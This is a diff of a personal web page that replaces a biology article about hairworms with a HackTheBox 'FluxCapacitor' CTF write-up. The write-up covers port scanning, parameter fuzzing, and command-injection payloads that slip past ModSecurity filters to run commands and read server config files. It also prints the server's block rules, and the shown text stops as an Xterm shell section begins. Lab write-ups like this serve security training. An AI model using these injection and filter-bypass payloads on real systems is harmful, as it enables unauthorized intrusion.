@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>Mind control parasites. How do they do it? - The Portal of Knowledge</title>
-  <meta property='og:title' content="Mind control parasites. How do they do it? - The Portal of Knowledge">
+  <title>FluxCapacitor write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="FluxCapacitor write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="Did you know that there are parasites that can manipulate the behavior of their host organism? The hairworms is such an example. Hairworms are long thin wormlike parasites. Their scientific name is Nematomorpha. Το ξέρατε ότι υπάρχουν παράσιτα που μπορούν να τροποποιούν τη συμπεριφορά του οργανισμού ξενιστή τους προς όφελός τους; Ένα τέτοιο παράδειγμα αποτέλουν κάποια σκωληκόμορφα παράσιτα των οποίων το επιστημονικό όνομα είναι Νηματόμορφα.">
-  <meta property="og:description" content="Did you know that there are parasites that can manipulate the behavior of their host organism? The hairworms is such an example. Hairworms are long thin wormlike parasites. Their scientific name is Nematomorpha. Το ξέρατε ότι υπάρχουν παράσιτα που μπορούν να τροποποιούν τη συμπεριφορά του οργανισμού ξενιστή τους προς όφελός τους; Ένα τέτοιο παράδειγμα αποτέλουν κάποια σκωληκόμορφα παράσιτα των οποίων το επιστημονικό όνομα είναι Νηματόμορφα.">
-  <meta property="og:image" content="https://alamot.github.io/images/brain_signals.jpg">
+  <meta name="description" content="Write-up for the FluxCapacitor machine (www.hackthebox.eu). Ανάλυση του μηχανήματος FluxCapacitor του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the FluxCapacitor machine (www.hackthebox.eu). Ανάλυση του μηχανήματος FluxCapacitor του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/capacitors.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/mindcontrol_parasites/">
+<meta property="og:url" content="https://alamot.github.io/fluxcapacitor_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "Mind control parasites. How do they do it? |  ",
+    "headline": "FluxCapacitor write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2013-10-03T00:00:00JST",
-    "dateModified": "2013-10-03T00:00:00JST",
+    "datePublished": "2018-05-13T00:00:00JST",
+    "dateModified": "2018-05-13T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -198,7 +198,18 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
         
         
          
-<li><a href="#span-lang-en-reference-span-span-lang-el-αναφορά-span"><span lang="en">Reference</span><span lang="el">Αναφορά</span></a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#fuzzing-sync">Fuzzing /Sync</a>
+<ul>
+<li><a href="#rce">RCE</a></li>
+</ul></li>
+<li><a href="#getting-xterm-shell">Getting Xterm shell</a></li>
+<li><a href="#getting-a-shell-by-uploading-a-linux-elf">Getting a shell by uploading a linux elf</a></li>
+<li><a href="#privilege-escalation">Privilege escalation</a></li>
+<li><a href="#autopwn-script">Autopwn script</a></li>
+</ul></li>
  
       
         <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
@@ -240,94 +251,409 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/brain_signals.jpg);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">Mind control parasites. How do they do it?</h1></header>
-            <header lang="el"><h1 class="title">Παράσιτα που ελέγχουν το μυαλό. Πώς το κάνουν;</h1></header>
+            <header lang="en"><h1 id="title" class="title">FluxCapacitor write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του FluxCapacitor</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">03 Oct 2013</time>
-            <time lang="el" class="topmargin7">03 Οκτ 2013</time>
+            <time lang="en" class="topmargin7">13 May 2018</time>
+            <time lang="el" class="topmargin7">13 Μαϊ 2018</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/biology'>
-                <span lang="en">Biology</span>
-                <span lang="el">Βιολογία</span>
+              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
+                <span lang="en">Cybersecurity</span>
+                <span lang="el">Κυβερνοασφάλεια</span>
               </a>
             
             &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/nematomorpha'>
-                <span lang="en">nematomorpha</span>
-                <span lang="el">νηματόμορφα</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
+                <span lang="en">hackthebox</span>
+                <span lang="el">hackthebox</span>
                 </a>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/parasite'>
-                <span lang="en">parasite</span>
-                <span lang="el">παράσιτο</span>
-                </a>
-            
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/mind'>
-                <span lang="en">mind</span>
-                <span lang="el">μυαλό</span>
-                </a>
-            
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/insect'>
-                <span lang="en">insect</span>
-                <span lang="el">έντομο</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/windows'>
+                <span lang="en">windows</span>
+                <span lang="el">windows</span>
                 </a>
             
          
+         <aside>
+          <section>
+            <header lang="en"><h2>Contents</h2></header>
+            <header lang="el"><h2>Περιεχόμενα</h2></header>
+            <div><nav id="TableOfContents">
+<ul>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#fuzzing-sync">Fuzzing /Sync</a>
+<ul>
+<li><a href="#rce">RCE</a></li>
+</ul></li>
+<li><a href="#getting-xterm-shell">Getting Xterm shell</a></li>
+<li><a href="#getting-a-shell-by-uploading-a-linux-elf">Getting a shell by uploading a linux elf</a></li>
+<li><a href="#privilege-escalation">Privilege escalation</a></li>
+<li><a href="#autopwn-script">Autopwn script</a></li>
+</ul></li>
+</ul>
+</nav></div>
+          </section>
+         </aside>
+        
         
 
-<p lang="en">Did you know that there are parasites that can manipulate the behavior of their host organism? The hairworms is such an example. Hairworms are long thin wormlike parasites. Their scientific name is <strong>Nematomorpha</strong>. They parasite mostly on insects, like crickets for example. Crickets are living on the land but hairworms can reproduce only in water. Therefore, hairworms have to «drive» their host towards water bodies. Most times this results in the death of the host because crickets get drawn themselves. This means, essentially, that they are forced to commit suicide! We do not know exactly how the hairworms accomplish to induce this self-destructing behavior. What means do they use to alter the mind of their host? One plausible explanation would be that the parasites induce a feeling of thirst to their hosts. But this doesn't seem to be true in this case.</p>
-<p lang="el">Το ξέρατε ότι υπάρχουν παράσιτα που μπορούν να τροποποιούν τη συμπεριφορά του οργανισμού ξενιστή τους προς όφελός τους; Ένα τέτοιο παράδειγμα αποτέλουν κάποια σκωληκόμορφα παράσιτα των οποίων το επιστημονικό όνομα είναι <strong>Νηματόμορφα</strong>. Παρασιτούν κυρίως σε έντομα, όπως σε γρύλους για παράδειγμα. Οι γρύλοι ζουν στην ξηρά, αλλά τα νηματόμορφα μπορούν να αναπαραχθούν μόνο μέσα στο νερό. Ως εκ τούτου τα νηματόμορφα πρέπει να «οδηγήσουν» τον ξενιστή τους προς υδάτινα σώματα. Τις περισσότερες φορές αυτό συνεπάγεται τον θάνατο του ξενιστή αφού οι γρύλοι καταλήγουν να πνίγονται. Ουσιαστικά, αυτό σημαίνει ότι οδηγήθηκαν στο να διαπράξουν αυτοκτονία! Δεν γνωρίζουμε πως ακριβώς τα νηματόμορφα κατορθώνουν να επάγουν αυτή την αυτοκαταστροφική συμπεριφορά. Τι μέσα χρησιμοποιούν για να τροποποιήσουν το μυαλό του ξενιστή τους; Μια πιθανή εξήγηση θα ήταν ότι τα παράσιτα επάγουν ένα αίσθημα δίψας στους ξενιστές τους. Αλλά αυτό δε φαίνεται να ισχύει σε αυτήν την περίπτωση.</p>
+<h1 id="enumeration">Enumeration</h1>
 
-<div class="row">
-<div class="col-md-6"><figure>
-<a title="By Márton Zsoldos [CC BY-SA 3.0 (http://creativecommons.org/licenses/by-sa/3.0)], via Wikimedia Commons" href="https://commons.wikimedia.org/wiki/File%3AH%C3%BArf%C3%A9reg.jpg" target="_blank">
-<img class="bordered" alt="Húrféreg" src="https://upload.wikimedia.org/wikipedia/commons/8/83/H%C3%BArf%C3%A9reg.jpg"/></a>
-</figure></div>
-<div class="col-md-6"><figure>
-<a title="By Alastair Rae from London, United Kingdom (Horsehair Worm) [CC BY-SA 2.0 (http://creativecommons.org/licenses/by-sa/2.0)], via Wikimedia Commons" href="https://commons.wikimedia.org/wiki/File%3AHorsehair_Worm_(14629048952).jpg" target="_blank">
-<img class="bordered" alt="Horsehair Worm (14629048952)" src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Horsehair_Worm_%2814629048952%29.jpg/512px-Horsehair_Worm_%2814629048952%29.jpg"/></a>
-</figure></div>
-</div>
+<h2 id="port-scanning">Port scanning</h2>
 
-<p lang="en">A collaborative team of scientists -from Switzerland, France and Venezuela- studied the responses of crickets to light as a possible mechanism. They thought that water surfaces reflect light, especially moonlight during the night. Maybe that was the stimulus that infected crickets were forced to follow. They caught crickets from a forest in Southern France. The crickets were shipped from France to Switzerland by express delivery (48 h). To study their response to light the scientists used a <i>locomotion compensator</i> or <i>servosphere</i>. This is a machine that can track the motion of the crickets at a rate of 0.1 sec with an accuracy of 0.1 mm. The scientists evaluated the effect of reflected light on the orientation behavior of uninfected and infected crickets.</p>
-<p lang="el">Μια διεθνής ομάδα επιστημόνων -από την Ελβετία, τη Γαλλία και τη Βενεζουέλα- μελέτησε τις αντιδράσεις των γρύλων στο φως ως έναν πιθανό μηχανισμό. Σκέφτηκαν ότι οι επιφάνειες του νερού αντανακλούν το φως και ειδικότερα το σεληνόφως κατά τη διάρκεια της νύχτας. Οπότε, ίσως, αυτό να ήταν το ερέθισμα που οι προσβεβλημένοι γρύλοι εξαναγκάζονταν να ακολουθήσουν. Παγίδευσαν, λοιπόν, γρύλους από ένα δάσος στη νότια Γαλλία και τους μετέφεραν στην Ελβετία μέσα σε 48 ώρες μέσω ταχυμεταφοράς. Για να μελετήσουν τις αντιδράσεις των γρύλων στο φως, οι επιστήμονες χρησιμοποίησαν έναν <i>αντισταθμιστή κίνησης</i> ή <i>σερβοσφαίρα</i>. Πρόκειται για ένα μηχάνημα που μπορεί να ανιχνεύει και να καταγράφει την κίνηση των γρύλων ανά 0.1 sec και με ακρίβεια 0.1 mm. Οι επιστήμονες μελέτησαν την επίδραση αντανακλώμενου φωτός στην συμπεριφορά προσανατολισμού προσβεβλημένων και μη γρύλων.</p>
+<p>Let&rsquo;s scan the full range of TCP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py</a>).</p>
 
-<p lang="en">They found that the hairworms induced a clear <em>phototactic</em> behavior in their hosts. This means that the infected crickets tend to direct their walk to the light stimulus. This behavior was not observed from the uninfected crickets. The results also indicate that the hairworms induced crickets to walk longer and faster. They also tested blind individuals in order to verify that their results were only due to light. The blinds ones were not attracted to light. Well, we have to note that they weren't actually blind. The researchers just painted their eyes black.</p>
-<p lang="el">Ανακάλυψαν ότι τα νηματόμορφα προκαλούσαν μια ξεκάθαρα <em>φωτοτακτική</em> συμπεριφορά στους ξενιστές τους. Δηλαδή, τα προσβεβλημένα άτομα έτειναν να κατευθύνουν το βάδισμά τους προς το φωτεινό ερέθισμα. Αυτή η συμπεριφορά δεν παρατηρήθηκε από τους μη προσβεβλημένους γρύλους. Τα αποτελέσματα έδειξαν επιπλέον ότι τα νηματόμορφα εξωθούσαν τους γρύλους να κινούνται με μεγαλύτερη ταχύτητα και να διανύουν μακρύτερες απόστασεις. Η ερευνητική ομάδα έλεγξε ακόμη και τυφλά άτομα για να επιβεβαιώσει ότι τα αποτελέσματα οφείλονται μόνο στην επίδραση του φωτός. Τα τυφλά άτομα δεν έδειξαν να έλκονται προς τα φωτεινά ερεθίσματα. Βέβαια, πρέπει να σημειώσουμε ότι τα άτομα δεν ήταν ακριβώς τυφλά. Απλά, τα μάτια τους είχαν βαφτεί με μαύρο χρώμα.</p>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.69 500
 
-<p lang="en">Additionally, to exclude thirst as a stimulus, they deprived uninfected crickets from water for 2 days. These individuals didn't show an altered behaviour. This shows that normal crickets do not look for water surfaces using a light cue even after water deprivation. This finding counters the widespread notion that hairworms cause host thirstiness to induce the approach to water. However, maybe 2 days of deprivation are not enough to induce water stress in the crickets. Therefore, this experiment cannot really exclude a potential effect of thirstiness.</p>
-<p lang="el">Επιπλέον, για να αποκλείσουν την δίψα ως ερέθισμα στέρησαν το νερό για 2 μέρες από μη προσβεβλημένους γρύλους. Αυτά τα άτομα δεν έδειξαν τροποποιημένη συμπεριφορά. Αυτό καταδεικνύει ότι οι φυσιολογικοί γρύλοι δεν αναζητούν επιφάνειες νερού χρησιμοποιώντας φωτεινά σήματα ούτε ύστερα από στέρηση νερού. Το εύρημα αυτό
-ακυρώνει την διαδεδομένη πεποίθηση ότι τα νηματόμορφα προκαλούν αίσθημα δίψας στον ξενιστή για να επάγουν της προσέγγιση με το νερό. Ίσως, όμως, δύο μέρες να μην είναι αρκετές για να προκληθεί αφυδατικό στρες στους γρύλους. Οπότε, αυτό το πείραμα δεν είναι αρκετό για να αποκλείσει τελείως μια ενδεχόμενη επίδραση της δίψας.</p>
+Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.69
 
-<p lang="en">In addition, they also tested ex-infected crickets. They found that the effect of hairworm infection is in part temporary. Ex-infected crickets recover progressively to normal, or close to normal behavior. More specifically, they submerged infected crickets into water and thus the hairworms came out. Initially, these ex-infected crickets showed the same phototactic behavior after 3 hours of disinfection. But as time passed they showed intermediate behavior. After 35 hours the percentage showing phototaxis was quite small. But the crickets continued to walk faster and longer. This means that the alteration of behavior induced by the parasites is progressively reversible to some degree, but not completely.</p>
-<p lang="el">Επιπροσθέτως, οι ερευνητές έλεγξαν και πρώην προσβεβλημένους γρύλους. Ανακάλυψαν ότι η επίδραση της προσβολής από νηματόμορφα είναι εν μέρει προσωρινή αφού τα πρώην νοσούντα άτομα επανήλθαν σταδιακά στη φυσιολογική, ή κοντά στη φυσιολογική, συμπεριφορά. Πιο συγκεκριμένα, βύθισαν προσβεβλημένους γρύλους στο νερό οπότε τα νηματόμορφα παράσιτα εξήλθαν από τα σώματα των ξενιστών τους. Αρχικά, τα πρώην προσβεβλημένα άτομα επέδειξαν την ίδια φωτοτακτική συμπεριφορά 3 ώρες ύστερα από την αποπαρασίτωσή τους. Αλλά, καθώς ο χρόνος περνούσε, άρχισαν να εμφανίζουν ενδιάμεσες συμπεριφορές. Ύστερα από 35 ώρες το ποσοστό που έδειχνε κάποιο φωτοτακτισμό ήταν πολύ μικρό. Πάντως, οι γρύλοι αυτοί διατήρησαν το χαρακτηριστικό να διανύουν μεγαλύτερές αποστάσεις και με μεγαλύτερη ταχύτητα. Αυτό δείχνει ότι η αλλοίωση της συμπεριφοράς που προκαλείται από τα παράσιτα είναι προοδευτικά αναστρέψιμη σε κάποιον βαθμό αλλά όχι πλήρως.</p>
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-05-11 21:23:48 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65536 ports/host]
+Discovered open port 80/tcp on 10.10.10.69                                     
+                                                                             
+Running command: sudo nmap -A -p80 10.10.10.69
 
-<p lang="en">The results of this research indicate something clearly. The response to light plays some role to the behavior of the infected crickets. But more details have to be examined. For example, what is the importance of the type, the angle and the wavelength of the light? Additional factors except light might also play a role. What induces the faster and longer motion? Finally, the molecular mechanisms of this parasitic relationship seem to be quite complex. What chemical substances are secreted from the parasites? What molecules are responsible for all these phenomena? What cellular processes are involved? There is evidence that even the process of cell death in the central nervous system of the host is modified by the parasites.</p>
-<p lang="el">Τα αποτελέσματα αυτής της έρευνας δείχνουν ξεκάθαρα κάτι. Η απάντηση στο φως παίζει κάποιο ρόλο στη συμπεριφορά των προσβεβλημένων γρύλων. Αλλά χρειάζεται να εξετασθούν περισσότερες λεπτομέρειες. Για παράδειγμα, ποιά είναι η σημασία του μήκου κύματος ή της γωνίας πρόπτωσης του φωτός; Επιπρόσθετοι παράγοντες εκτός του φωτός μπορεί επίσης να παίζουν ρόλο. Τι είναι αυτό που επάγει την μεγαλύτερη και γρηγορότερη μετακίνηση; Τέλος, οι μοριακοί μηχανισμοί αυτής της παρασιτικής σχέσης φαίνεται να είναι αρκετά σύνθετοι. Ποιές χημικές ουσίες εκκρίνονται από τα παράσιτα; Ποιά χημικά μόρια είναι υπεύθυνα για όλα αυτά τα φαινόμενα; Ποιές κυτταρικές διεργασίες εμπλέκονται; Υπάρχουν ενδείξεις ότι ακόμη και η διεργασία του κυτταρικού θανάτου στο κεντρικό νευρικό σύστημα του ξενιστή υφίσταται τροποποιήσεις από τα παράσιτα.</p>
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-12 00:27 EEST
+Nmap scan report for node1.fluxcapacitor.htb (10.10.10.69)
+Host is up (0.100s latency).
 
-<p lang="en" class="author">Antonios Tsolis</p>
-<p lang="el" class="author">Αντώνιος Τσώλης</p>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    SuperWAF
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Date: Fri, 11 May 2018 21:28:20 GMT
+|     Content-Type: text/html
+|     Content-Length: 175
+|     Connection: close
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
+|     &lt;body bgcolor=&#34;white&#34;&gt;
+|     &lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
+|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Fri, 11 May 2018 21:28:19 GMT
+|     Content-Type: text/html
+|     Content-Length: 395
+|     Last-Modified: Tue, 05 Dec 2017 16:02:29 GMT
+|     Connection: close
+|     ETag: &#34;5a26c315-18b&#34;
+|     Server: SuperWAF
+|     Accept-Ranges: bytes
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;Keep Alive&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     node1 alive
+|     &lt;!--
+|     Please, add timestamp with something like:
+|     &lt;script&gt; $.ajax({ type: &#34;GET&#34;, url: &#39;/sync&#39; }); &lt;/script&gt;
+|     &lt;hr/&gt;
+|     FluxCapacitor Inc. info@fluxcapacitor.htb - http://fluxcapacitor.htb&lt;br&gt;
+|     &lt;em&gt;&lt;met&gt;&lt;doc&gt;&lt;brown&gt;Roads? Where we&#39;re going, we don&#39;t need roads.&lt;/brown&gt;&lt;/doc&gt;&lt;/met&gt;&lt;/em&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 405 Not Allowed
+|     Date: Fri, 11 May 2018 21:28:19 GMT
+|     Content-Type: text/html
+|     Content-Length: 179
+|     Connection: close
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;405 Not Allowed&lt;/title&gt;&lt;/head&gt;
+|     &lt;body bgcolor=&#34;white&#34;&gt;
+|     &lt;center&gt;&lt;h1&gt;405 Not Allowed&lt;/h1&gt;&lt;/center&gt;
+|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   RTSPRequest: 
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
+|     &lt;body bgcolor=&#34;white&#34;&gt;
+|     &lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
+|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   X11Probe: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Fri, 11 May 2018 21:28:20 GMT
+|     Content-Type: text/html
+|     Content-Length: 179
+|     Connection: close
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
+|     &lt;body bgcolor=&#34;white&#34;&gt;
+|     &lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
+|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+|_http-server-header: SuperWAF
+|_http-title: Keep Alive
 
-<h1 id="span-lang-en-reference-span-span-lang-el-αναφορά-span"><span lang="en">Reference</span><span lang="el">Αναφορά</span></h1>
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%)
+No exact OS matches for host (test conditions non-ideal).</code></pre></div></div>
 
-<ul>
-<li>Fleur Ponton, Fernando Otálora-Luna, Thierry Lefèvre, Patrick M. Guerin, Camille Lebarbenchon, David Duneau, David G. Biron, and Frédéric Thomas. Water-seeking behavior in worm-infected crickets and reversibility of parasitic manipulation Behavioral Ecology (2011) 22 (2): 392-400 first published online February 8, 2011 (<a href="http://beheco.oxfordjournals.org/content/22/2/392.full" target="_blank">beheco.oxfordjournals.org/content/22/2/392.full</a>)</li>
-</ul>
+<h2 id="fuzzing-sync">Fuzzing /Sync</h2>
+
+<p>If we visit <a href="http://10.10.10.69/" target="_blank">http://10.10.10.69/</a> and have a look in the source code, we see this:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+	&lt;script&gt; $.ajax({ type: &#34;GET&#34;, url: &#39;/sync&#39; }); &lt;/script&gt;
+...</code></pre></div></p>
+
+<p>Let&rsquo;s check that url:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">curl http://10.10.10.69/sync --verbose
+
+*   Trying 10.10.10.69...
+* TCP_NODELAY set
+* Connected to 10.10.10.69 (10.10.10.69) port 80 (#0)
+&gt; GET /sync HTTP/1.1
+&gt; Host: 10.10.10.69
+&gt; User-Agent: curl/7.57.0
+&gt; Accept: */*
+&gt; 
+&lt; HTTP/1.1 200 OK
+&lt; Date: Mon, 18 Dec 2017 07:25:54 GMT
+&lt; Content-Type: text/plain
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; Server: SuperWAF
+&lt; 
+20171218T08:25:54</code></pre></div></div></p>
+
+<p>Note that there is a filter that blocks some user agents. So if you have the word &ldquo;Mozilla&rdquo; or &ldquo;Opera&rdquo; in your user agent string you will get 403 forbidden. Here is the relevant rule from the /usr/local/ope\nresty/nginx/conf/nginx.conf file:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">    SecRule REQUEST_HEADERS:User-Agent &#34;^(Mozilla|Opera)&#34; &#34;id:1,phase:2,t:trim,block&#34;</code></pre></div></p>
+
+<p>Now let&rsquo;s fuzz /sync to see if we find anything interesting:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ wfuzz --hh BBB -H &#34;User-Agent:alamot&#34; -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.69/sync/?FUZZ{not_this}=test
+********************************************************
+* Wfuzz 2.1.5 - The Web Bruteforcer                      *
+********************************************************
+
+Target: http://10.10.10.69/sync/?FUZZ=test
+Total requests: 2589
+
+==================================================================
+ID	Response   Lines      Word         Chars          Request    
+==================================================================
+
+00000:  C=200      2 L	       1 W	     19 Ch	  &#34;not_this&#34;
+00705:  C=403      7 L	      10 W	    175 Ch	  &#34;opt&#34;</code></pre></div></div></p>
+
+<p>We used /sync/?FUZZ{not_this}=test and we hoped to get a different answer for some parameter. The {not_this} is something we know that it doesn&rsquo;t exist and it help us to set the baseline. We are lucky because &ldquo;test&rdquo; is forbidden and we get a different answer when it is used in context with the parameter opt. Other value that would work is for example &ldquo;date&rdquo;. We will see that there is a filter that forbiddens all the words that there are inside  the /usr/local/openresty/nginx/conf/unixcmd.txt file.</p>
+
+<h3 id="rce">RCE</h3>
+
+<p>We can get RCE like this:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whoami&#39;&#34;
+nobody
+bash: -c: option requires an argument</code></pre></div></div></p>
+
+<p>We can bypass some filtering using backslash escape \ or brace expansion []:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whi[c]h mk\nod&#39;&#34;
+/bin/mknod</code></pre></div></div></p>
+
+<p>Now, let&rsquo;s examine a little more the point of injection using the command ps:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">curl &#34;http://10.10.10.69/sync?opt=&#39; p\s aux&#39;&#34;
+nobody   29849  0.0  0.0   4608   868 ?        S    17:19   0:00 sh -c CMD=&#39;/home/themiddle/checksync &#39; p\s aux&#39;&#39;; bash -c ${CMD} 2&gt;&amp;1</code></pre></div></div></p>
+
+<p>We can get and examine some files like this:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/nginx.conf&#39;&#34; &gt; nginx.conf
+curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/unixcmd.txt&#39;&#34; &gt; unixcmd.txt</code></pre></div></div></p>
+
+<p>If we look inside nginx.conf we see the filtering rules and the command injection point:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+    modsecurity on;
+        location /sync {
+        default_type &#39;text/plain&#39;;
+
+        modsecurity_rules &#39;
+        SecDefaultAction &#34;phase:1,log,auditlog,deny,status:403&#34;
+        SecDefaultAction &#34;phase:2,log,auditlog,deny,status:403&#34;
+
+        SecRule REQUEST_HEADERS:User-Agent &#34;^(Mozilla|Opera)&#34; &#34;id:1,phase:2,t:trim,block&#34;
+
+        SecRuleEngine On
+        SecRule ARGS &#34;@rx [;\(\)\|\`\&lt;\&gt;\&amp;\$\*]&#34; &#34;id:2,phase:2,t:trim,t:urlDecode,block&#34;
+        SecRule ARGS &#34;@rx (user\.txt|root\.txt)&#34; &#34;id:3,phase:2,t:trim,t:urlDecode,block&#34;
+        SecRule ARGS &#34;@rx (\/.+\s+.*\/)&#34; &#34;id:4,phase:2,t:trim,t:urlDecode,block&#34;
+        SecRule ARGS &#34;@rx (\.\.)&#34; &#34;id:5,phase:2,t:trim,t:urlDecode,block&#34;
+        SecRule ARGS &#34;@rx (\?s)&#34; &#34;id:6,phase:2,t:trim,t:urlDecode,block&#34;
+
+        SecRule ARGS:opt &#34;@pmFromFile /usr/local/openresty/nginx/conf/unixcmd.txt&#34; &#34;id:99,phase:2,t:trim,t:urlDecode,block&#34;
+        &#39;;
+
+        content_by_lua_block {
+        local opt = &#39;date&#39;
+        if ngx.var.arg_opt then
+            opt = ngx.var.arg_opt
+        end
+
+        -- ngx.say(&#34;DEBUG: CMD=&#39;/home/themiddle/checksync &#34;..opt..&#34;&#39;; bash -c $CMD 2&gt;&amp;1&#34;)
+
+        local handle = io.popen(&#34;CMD=&#39;/home/themiddle/checksync &#34;..opt..&#34;&#39;; bash -c ${CMD} 2&gt;&amp;1&#34;)
+        local result = handle:read(&#34;*a&#34;)
+        handle:close()
+        ngx.say(result)
+        }
+...</code></pre></div></p>
+
+<h2 id="getting-xterm-shell">Getting Xterm shell</h2>
+
+<p>Make sure your Xserver is listening to TCP:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ netstat -lntup
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::6000                 :::*                    LISTEN      -                   </code></pre></div></div></p>
+
+<p>New Xserver versions have tcp listening disabled by default. Consult your distro how to enable it. You may have to change your display manager settings or the xserverrc file, e.g.:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /etc/X11/xinit/xserverrc
+<span class="cp">#!/bin/sh
